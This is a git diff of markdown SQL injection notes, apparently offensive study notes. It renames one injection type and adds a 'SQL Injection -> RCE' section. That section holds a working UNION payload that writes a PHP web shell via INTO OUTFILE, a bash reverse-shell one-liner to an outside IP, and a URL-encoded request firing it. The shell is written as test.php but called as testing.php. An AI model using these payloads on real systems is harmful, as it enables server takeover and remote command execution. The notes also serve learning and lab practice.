@@ -6,7 +6,7 @@ There are several types of SQL injections, including:
 - **Error-based SQL injection**: This type of SQL injection exploits errors in the SQL code to obtain information. For example, if a query returns an error with a specific message, that message can be used to obtain additional information from the system.
 - **Time-based SQL injection**: This type of SQL injection uses a query that takes a long time to execute to obtain information. For example, if you use a query that performs a lookup on a table and you add a delay in the query, you can use that delay to obtain additional information.
 - **Boolean-based SQL injection**: This type of SQL injection uses queries with Boolean expressions to obtain additional information. For example, a query with a Boolean expression can be used to determine whether a user exists in a database.
-- **Join-based SQL injection**: This type of SQL injection uses the "UNION" clause to combine two or more queries into one query. For example, if a query that returns information about users is used and a "UNION" clause is added with another query that returns information about permissions, additional information about user permissions can be obtained.
+- **Union-based SQL injection**: This type of SQL injection uses the "UNION" clause to combine two or more queries into one query. For example, if a query that returns information about users is used and a "UNION" clause is added with another query that returns information about permissions, additional information about user permissions can be obtained.
 - **SQL injection based on stacked queries**: This type of SQL injection takes advantage of the possibility of executing multiple queries in a single statement to obtain additional information. For example, you can use a query that inserts a record into a table and then add an additional query that returns information about the table.
 
 It should be noted that, in addition to the techniques mentioned above, there are many other types of SQL injections. However, these are some of the most popular and commonly used by attackers on vulnerable web pages.
@@ -327,4 +327,22 @@ def makeSQLI():
 
 if __name__ == '__main__':
     makeSQLI()
+```
+
+### SQL Injection -> RCE
+
+#### INTO OUTFILE
+
+We can obtain an *RCE* if the database accepts the *INTO OUTFILE* command, which allows us to export to an *external file* malicious code to be able to execute it later from the browser:
+
+```bash
+' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/test.php'-- -
+```
+
+Then we can access *test.php* by running the classic *one-liner* to execute a *reverse shell*:
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.36/443 0>&1'
+
+http://10.129.95.235/testing.php?cmd=%20bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.36/443+0%3E%261%27
 ```
